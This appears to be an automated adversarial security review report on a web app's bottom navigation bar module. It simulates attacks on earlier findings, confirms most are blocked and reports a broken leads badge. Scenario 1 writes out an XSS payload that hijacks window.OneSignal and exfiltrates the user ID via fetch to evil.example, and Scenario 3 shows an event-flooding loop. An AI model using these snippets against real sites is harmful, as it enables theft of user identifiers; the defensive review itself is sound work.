# THANOS ADVERSARIAL REPORT — features/shell/modules/bottom-bar

## Output Metadata

| Field | Value |
|---|---|
| Command | THANOS |
| Scope | `apps/VCSM/src/features/shell/modules/bottom-bar/` |
| Application Scope | VCSM |
| Mode | Full adversarial run — Areas 0–9 |
| TOXIN Report Consumed | YES — `outputs/2026/06/06/TOXIN/TOXIN_SECURITY_REPORT.md` |
| TOXIN Report Age | 0 days (same session) |
| TOXIN Gate | PASS |
| Run Date | 2026-06-06 |
| Status | COMPLETE |
| Verdict | THANOS_CAUTION |

---

## Boundary Contract Declarations

| Contract | Loaded | Enforced |
|---|---|---|
| `.claude/contracts/boundary.md` | YES | YES |
| `.claude/contracts/blue-team-verification-contract.md` | YES | YES |
| `.claude/contracts/red-vs-blue-security-warfare-contract.md` | YES | YES |

Application Scope: **VCSM**
Code modification: NONE — adversarial analysis only
External systems targeted: NONE

---

## TOXIN Dependency Gate (Area 0)

| Check | Result |
|---|---|
| TOXIN report present | PASS |
| TOXIN scope matches | PASS — `features/shell/modules/bottom-bar/` |
| TOXIN report age ≤ 7 days | PASS — same session (0 days) |
| TOXIN status was SUCCESS | PASS |
| THANOS may proceed | YES |

---

## Source Files Read (THANOS Direct Verification)

| File | Reason |
|---|---|
| `components/BottomNavBar.jsx` | Verify OneSignal hook call site, identity use, noti:refresh dispatch |
| `components/VportLeadsChip.jsx` | Verify actorId sourcing, leadsPath construction |
| `hooks/useVportLeadsCount.js` | Verify callerActorId sourcing, ownership gate call |
| `services/onesignal/onesignalClient.js` | Simulate _frozenSdk race window attack |
| `services/onesignal/initOneSignal.js` | Trace SDK load timing |
| `shared/hooks/useOneSignalPush.js` | Verify call sequence, user.id binding |
| `state/identity/identityContext.jsx` | Resolve identity shape, actor switch flow |
| `state/identity/identity.model.js` | Confirm public identity fields (actorId, ownerActorId, kind) |
| `features/hydration/vcsmActorHydrator.js` | Confirm ownerActorId population for vport actors |
| `features/booking/controller/assertActorOwnsVportActor.controller.js` | Verify kind gate, self-shortcut conditions |
| `features/dashboard/.../controller/vportLeads.controller.js` | Verify callerActorId usage in countNewVportLeadsController |

---

## Attack Scenarios

---

### Attack Scenario 1 — TOXIN-BB-001: OneSignal _frozenSdk Race Window

**Target Finding:** TOXIN-BB-001 (MEDIUM — OneSignal XSS amplification)
**Attack Type:** Timing-dependent XSS amplification

**Adversarial Simulation:**

```
Step 1: Page loads → <script src="OneSignal CDK"> executes → window.OneSignal = realSDK
Step 2: BottomNavBar mounts → initOneSignal() → window.OneSignalDeferred.push(callback)
Step 3: OneSignal init callback fires → SDK initialized
Step 4: ===== XSS INJECTION WINDOW =====
        Attacker executes: window.OneSignal = { login: (id) => fetch('https://evil.example/'+id) }
        At this point: _frozenSdk = null (no os() call yet)
Step 5: Identity hydration completes (async — DB calls for actor resolution)
Step 6: useOneSignalPush effect fires for [user?.id, identity?.actorId]
        → loginOneSignalExternalUser(user.id) called
        → os() → _frozenSdk = null → reads window.OneSignal → captures ATTACKER'S object
        → _frozenSdk = { login: (id) => fetch('evil.example/'+id) }
        → await sdk.login(String(user.id)) → fetch('evil.example/' + user.id)
Step 7: Exfiltration complete. user.id (Supabase auth UUID) transmitted to attacker.
```

**Key source evidence:**
```js
// onesignalClient.js
let _frozenSdk = null
function os() {
  if (_frozenSdk) return _frozenSdk          // ← protective AFTER first call
  const sdk = window.OneSignal ?? null
  if (sdk) _frozenSdk = sdk                  // ← race window: if attacker replaced before here
  return sdk
}
```

**Verified attack preconditions:**
1. XSS must already be present in the page — prerequisite, not delivered by this bug
2. XSS must fire AFTER real SDK loads (to avoid SDK script overwriting the fake) AND BEFORE first `os()` call
3. Identity hydration must not have completed before XSS fires
4. Timing window size: varies with SDK load speed and DB response time for identity resolution (typically 500ms–3s on mobile)

**Exfiltration target confirmed:** `user.id` — the Supabase auth UUID, passed as `loginOneSignalExternalUser(user.id)` in `useOneSignalPush`. This is the auth-layer UUID, NOT the actorId. Without an active JWT, this UUID has limited standalone utility but enables account enumeration and identity correlation.

**Post-freeze protection confirmed:** After the first successful `os()` call with the real SDK, `_frozenSdk` is bound and all subsequent calls use the frozen reference — XSS cannot hijack post-freeze.

**Verdict:** `EXPLOIT_REACHABLE` (conditional — requires XSS precondition + timing window)

---

### Attack Scenario 2 — TOXIN-BB-002: Raw UUID Navigation Authorization Bypass

**Target Finding:** TOXIN-BB-002 (LOW — raw actorId in VportLeadsChip URL)
**Attack Type:** Unauthorized resource access via known UUID

**Adversarial Simulation:**

```
Step 1: Attacker observes URL bar: /actor/f47ac10b-58cc-4372-a567-0e02b2c3d479/dashboard/leads
Step 2: Attacker opens new session (different user, no ownership)
Step 3: Attacker navigates directly to: /actor/f47ac10b-58cc-4372-a567-0e02b2c3d479/dashboard/leads
Step 4: Dashboard route loads → calls countNewVportLeadsController or listVportLeadsController
        with attacker's actorId as callerActorId
Step 5: assertActorOwnsVportActorController({
          requestActorId: attackerActorId,
          targetActorId: victimVportActorId
        })
        → getActorByIdDAL({ actorId: attackerActorId }) → kind: "user" ✓
        → String(attackerActorId) !== String(victimVportActorId) → no self-shortcut
        → readActorOwnerLinkByActorAndUserProfileDAL({ targetActorId: victimVportActorId, ... })
        → DB query: does attackerActorId own victimVportActorId? → NO → throws
        → 403 / access denied
```

**Authorization gate is source-verified at the controller layer.** Route navigation alone grants no data access.

**Information disclosure confirmed:** The UUID IS present in the URL and observable in browser history, referrer headers, and analytics payloads. This is an information disclosure, not an access bypass.

**Verdict:** `EXPLOIT_BLOCKED` (for authorization bypass) — `STILL_OPEN_SOURCE_VERIFIED` (for information disclosure)

---

### Attack Scenario 3 — TOXIN-BB-003: noti:refresh DOM Event Escalation

**Target Finding:** TOXIN-BB-003 (LOW — any-origin noti:refresh dispatch)
**Attack Type:** Event-triggered data escalation

**Adversarial Simulation:**

```
Step 1: Attacker has XSS in page context
Step 2: Attacker executes: window.dispatchEvent(new Event('noti:refresh'))
Step 3: bootstrap.hydrate.controller listener fires:
        → queryClient.invalidateQueries({ queryKey: queryKeys.notificationUnread(actorId) })
        → queryClient.invalidateQueries({ queryKey: queryKeys.chatUnread(actorId) })
Step 4: React Query re-fetches from server using the AUTHENTICATED user's session
        → getUnreadNotificationCount(actorId) → returns count for AUTHENTICATED user only
        → getUnreadBadgeCount(actorId) → returns count for AUTHENTICATED user only
Step 5: Badge updates to correct server value for the authenticated user.
        Attacker sees: nothing. No cross-user data, no PII, no escalation.
```

**Escalation attempt — continuous dispatch:**
```
setInterval(() => window.dispatchEvent(new Event('noti:refresh')), 100)
```
→ React Query's `staleTime` and deduplication limits actual re-fetches
→ Maximum impact: badge polling surge, not data leakage

**Verdict:** `EXPLOIT_BLOCKED` — no data escalation possible. Finding remains LOW for DoS-adjacent polling abuse potential only.

---

### Attack Scenario 4 — TOXIN-BB-004: Actor-Switch Stale profileIdRef

**Target Finding:** TOXIN-BB-004 (LOW — stale profileIdRef during actor switch)
**Attack Type:** Cross-actor data exposure via stale reference

**Adversarial Simulation:**

```
Step 1: User has persona A (vportActorIdA) active
Step 2: useVportLeadsCount(vportActorIdA) called
        → countNewVportLeadsController(vportActorIdA, callerActorId=vportActorIdA)
        → assertActorOwnsVportActorController({
            requestActorId: vportActorIdA,  ← kind: "vport"
            targetActorId:  vportActorIdA
          })
        → requesterActor.kind = "vport" → throws immediately
        → silent catch → count = 0
        → profileIdRef.current = null (never set — refresh throws)
Step 3: User switches to persona B (vportActorIdB)
Step 4: pollRefresh fires with profileIdRef.current = null
        → if (!profileId) { await refresh(); return }
        → refresh() called → same failure path as Step 2
Step 5: Count stays 0 in all cases.
```

**Critical discovery during adversarial simulation:** The stale profileId race described in TOXIN-BB-004 CANNOT OCCUR because `profileIdRef.current` is NEVER populated. The `refresh()` call fails at the `assertActorOwnsVportActorController` gate before reaching `profileIdRef.current = result.resolvedProfileId`. The stale ref attack chain is inert.

**Root cause identified (new finding — see THANOS-BB-NEW-001):** `callerActorId = identity?.actorId` returns the vport actorId when vport persona is active. The ownership gate requires kind: "user". The gate ALWAYS rejects, making both refresh() and pollRefresh() no-ops.

**Verdict:** `EXPLOIT_BLOCKED` — stale race attack impossible because profileIdRef is never populated

---

### Attack Scenario 5 — TOXIN-BB-ARCH-001: Profiles Controller Slug Cache Poisoning

**Target Finding:** TOXIN-BB-ARCH-001 (CRITICAL arch / LOW security — direct controller import)
**Attack Type:** Slug cache poisoning via direct controller import

**Adversarial Simulation:**

```
Step 1: Attacker with XSS calls buildActorCanonicalSlugController(victimActorId)
        → Fetches from vport.public_actor_seo_v (PUBLIC view — no auth required)
        → Caches slug for victimActorId in controllerCache
Step 2: BottomNavBar ProfileNavTab fires
        → getCachedActorCanonicalSlug(actorId) → returns cached entry for actorId
        → navigate(`/profile/${slug}`)
        Data in slug: display name, category, location — ALL PUBLIC SEO data
Step 3: Attacker gains: ...nothing sensitive. The cache contains only public display data.
```

**Source-verified:** `vport.public_actor_seo_v` is a PUBLIC view (SEO data intended for public indexing). The slug contains: actor display name, vport category, city, state. No PII, no auth credentials, no actorId UUID.

**Direct import security impact:** The import bypasses the adapter contract but does not bypass any authorization gate. The controller reads a public view.

**Verdict:** `FALSE_POSITIVE` (for security) — architecture violation confirmed, zero exploitability. `EXPLOIT_BLOCKED` classification.

---

### Attack Scenario 6 — TOXIN-BB-ARCH-002: Dashboard Controller Import Bypass

**Target Finding:** TOXIN-BB-ARCH-002 (MEDIUM arch / LOW security — dashboard controller direct import)
**Attack Type:** Adapter bypass to circumvent authorization

**Adversarial Simulation:**

```
Step 1: Attacker in bottom-bar context calls countNewVportLeadsController directly
        (vs. via an adapter — same function either way)
Step 2: Controller immediately calls assertActorOwnsVportActorController
Step 3: Gate checks: requester kind, actor existence, owner link in actor_owners table
Step 4: No authorization check is skipped by bypassing the adapter layer.
        The adapter would simply re-export the same controller function.
```

**Verdict:** `FALSE_POSITIVE` (for security) — architecture violation confirmed, zero authorization bypass possible.

---

## New THANOS Finding

---

### THANOS-BB-NEW-001 — callerActorId Field Mismatch: Leads Badge Permanently Non-Functional for Vport Personas

**Status:** NEW_FINDING_CREATED
**Severity:** MEDIUM (functional) / INFO (security)
**Classification:** NEEDS_DB_VERIFICATION (to confirm ownerActorId reliability at runtime)
**Source Files:**
- `hooks/useVportLeadsCount.js`
- `state/identity/identity.model.js`
- `features/hydration/vcsmActorHydrator.js`
- `features/booking/controller/assertActorOwnsVportActor.controller.js`

**Finding:**

During adversarial simulation of TOXIN-BB-004, a fundamental broken chain was discovered:

**Step 1 — Public identity shape confirmed:**
```js
// identity.model.js — toPublicIdentity()
return {
  actorId: source.actorId,        // when vport active: vportActorId (kind: "vport")
  kind: source.kind,              // "vport"
  ownerActorId: source.ownerActorId ?? null,  // userActorId (kind: "user") ← CORRECT CALLER FIELD
  realmId: source.realmId ?? null,
}
```

**Step 2 — ownerActorId confirmed populated by hydrator:**
```js
// vcsmActorHydrator.js — vport branch
const ownerActor = await readUserActorByProfileIdDAL(ownerRow.user_id);
ownerActorId = ownerActor?.id ?? null;
// ...
return { ...mapVportActor(...), ownerActorId }  // ← correct user actorId
```

**Step 3 — Hook reads wrong field:**
```js
// useVportLeadsCount.js
const { identity } = useIdentity();
const callerActorId = identity?.actorId ?? null;  // ← vportActorId when vport active
//                                                     SHOULD BE: identity?.ownerActorId
```

**Step 4 — Ownership gate always rejects:**
```js
// assertActorOwnsVportActor.controller.js
const requesterActor = await getActorByIdDAL({ actorId: requestActorId });
if (requesterActor.kind !== "user") {
  throw new Error("Only actor owners can manage this booking resource.");
  // ↑ ALWAYS fires when callerActorId = vportActorId (kind: "vport")
}
```

**Step 5 — Silent catch swallows the error:**
```js
// useVportLeadsCount.js
try {
  const result = await countNewVportLeadsController(actorId, callerActorId);
  profileIdRef.current = result.resolvedProfileId;
  setCount(result.count ?? 0);
} catch {
  // silent — background badge  ← gate rejection lands here
}
// count stays 0 → VportLeadsChip null return guard fires → chip never renders
```

**Net result:** VportLeadsChip NEVER displays a non-zero badge when the vport persona is active. The leads badge feature is silently broken for all vport owners.

**Security assessment:** The ownership gate is working correctly — it correctly rejects vport-kind actors as requestors. There is no authorization bypass. The bug prevents the intended feature from working rather than enabling unauthorized access.

**Correct fix (text only):**
```js
// useVportLeadsCount.js
const callerActorId = identity?.ownerActorId ?? identity?.actorId ?? null;
// When vport active: ownerActorId = user actorId (kind: "user") → gate passes
// When user active: ownerActorId = null, fallback to actorId = user actorId → gate passes
```

**DB verification needed:** Confirm `ownerActorId` is reliably populated for all vport identity states (new vport creation before first hydration cycle, delegated access vports, blocked/deleted vports).

**Downstream routing:** PATCH command (fix), SPIDER-MAN (regression test for badge display), DB (verify ownerActorId population edge cases)

---

## Attack Summary Matrix

| TOXIN Finding | Attack Attempted | Result | Classification |
|---|---|---|---|
| TOXIN-BB-001 | XSS + _frozenSdk race window → user.id exfil | EXPLOIT_REACHABLE (conditional) | Requires XSS + timing window |
| TOXIN-BB-002 | UUID navigation → unauthorized leads access | EXPLOIT_BLOCKED | UUID disclosed; auth gate correct |
| TOXIN-BB-003 | Event dispatch → cross-user data escalation | EXPLOIT_BLOCKED | Polling surge only; no data leakage |
| TOXIN-BB-004 | Stale profileId → cross-actor count exposure | EXPLOIT_BLOCKED | profileIdRef never populated; gate always rejects |
| TOXIN-BB-ARCH-001 | Slug cache poisoning via controller bypass | EXPLOIT_BLOCKED | Public SEO data; no auth escalation |
| TOXIN-BB-ARCH-002 | Dashboard adapter bypass → auth skip | EXPLOIT_BLOCKED | Gate at controller layer; adapter is pass-through |
| VEN-BN-005 | Identity context bypass → spoofed identity | EXPLOIT_BLOCKED | Patch verified; adapter re-exports same context |
| **THANOS-BB-NEW-001** | N/A — discovered during simulation | NEW_FINDING_CREATED | Wrong field → gate always rejects → badge broken |

---

## Behavior Contract Attack Summary (Area 9)

**BEHAVIOR.md §9 — Must Never Happen — adversarial check:**

| Invariant | Attack Attempted | Result |
|---|---|---|
| MUST NEVER render BottomNavBar outside RootLayout tree | Checked import consumers — only RootLayout imports it | PASS |
| MUST NEVER remove BottomNavBar from DOM on route change | RootLayout CSS display:none confirmed — element stays in DOM | PASS |
| MUST NEVER dispatch noti:refresh without pathname guard | Source-verified: if (!path.startsWith('/notifications') && !path.startsWith('/chat')) return | PASS |
| MUST NEVER expose raw actorId UUID in user-visible URL | VportLeadsChip still generates `/actor/{uuid}/dashboard/leads` | FAIL — ELEK-002 open |
| MUST NEVER allow window.OneSignal to be replaced mid-session without re-binding | _frozenSdk pattern partially mitigates; race window exists before freeze | PARTIAL |

**BEHAVIOR.md §2 stale finding confirmed:** VportLeadsChip is documented as "Conditionally mounted" but is now always-mounted. Update required.

---

## Closure Verification Summary

| Finding | Closure Verified | Notes |
|---|---|---|
| TOXIN-BB-001 | NO — still exploitable | Conditional on XSS |
| TOXIN-BB-002 | NO — still open (info disclosure) | Auth blocked, UUID still exposed |
| TOXIN-BB-003 | YES — blocked | No meaningful escalation path |
| TOXIN-BB-004 | BLOCKED differently than expected | Inert due to THANOS-BB-NEW-001 root cause |
| VEN-BN-005 | CLOSED_SOURCE_VERIFIED | Adapter boundary satisfied |

---

## New Finding Discovery Check (Mandatory)

| Check | Result |
|---|---|
| Original exploit retested | PASS — all TOXIN scenarios simulated |
| Alternate exploit paths searched | PASS — callerActorId field mismatch discovered |
| Patch bypasses searched | PASS — VEN-BN-005 closure verified |
| Trust boundaries evaluated | PASS — ownership gate chain fully traced |
| Regressions searched | PASS — ownerActorId hydrator flow verified |
| Replacement vulnerabilities searched | PASS — THANOS-BB-NEW-001 surfaced |

---

## THOR Release Blockers

| Blocker | Finding | Severity |
|---|---|---|
| NO active THOR blocker from THANOS run | — | — |

TOXIN-BB-001 is `EXPLOIT_REACHABLE` but requires XSS as a prerequisite. It does not independently constitute a THOR block for this module — the XSS precondition is a platform-wide risk, not a bottom-bar module defect. Route to SPIDER-MAN for regression coverage and to the patch command for the freeze fix.

THANOS-BB-NEW-001 is a functional bug (badge never shows), not a security THOR blocker.

---

## Severity Counts

| Severity | Count |
|---|---|
| EXPLOIT_REACHABLE | 1 (TOXIN-BB-001 — conditional) |
| EXPLOIT_BLOCKED | 5 |
| FALSE_POSITIVE | 2 |
| CLOSED_SOURCE_VERIFIED | 1 (VEN-BN-005) |
| NEW_FINDING_CREATED | 1 (THANOS-BB-NEW-001) |

---

## Recommended Downstream Commands

| Command | Scope | Priority |
|---|---|---|
| PATCH | THANOS-BB-NEW-001: fix `callerActorId = identity?.ownerActorId ?? identity?.actorId` in `useVportLeadsCount.js` | P1 |
| PATCH | TOXIN-BB-001: freeze `window.OneSignal` post-init in `initOneSignal.js` | P2 |
| PATCH | TOXIN-BB-002: replace raw UUID path in VportLeadsChip with slug-based navigation | P3 |
| SPIDER-MAN | Regression coverage: leads badge display when vport persona active; VEN-BN-005 closure | P2 |
| TASKMASTER | Code scan: `identity?.actorId` used as callerActorId across other hooks — verify no similar field mismatch | P2 |
| DB | Verify `ownerActorId` population for new vport creation edge case; confirm `actor_owners` RLS on count query | P3 |

---

## THANOS Verdict

**THANOS_CAUTION**

- 1 conditional exploit reachable (TOXIN-BB-001) — requires XSS + timing window precondition
- 1 new functional bug discovered (THANOS-BB-NEW-001) — leads badge silently broken for all vport personas
- 5 TOXIN findings confirmed blocked through adversarial simulation
- 2 TOXIN architecture findings confirmed as false positives for security
- VEN-BN-005 closure confirmed

No active THOR blockers from this run. PATCH command for THANOS-BB-NEW-001 is the priority action — it fixes a broken feature AND closes the ownerActorId field-mismatch concern. TOXIN-BB-001 XSS freeze fix is P2.

THANOS does not emit THOR_RELEASE_ELIGIBLE. Release authority belongs exclusively to THOR.
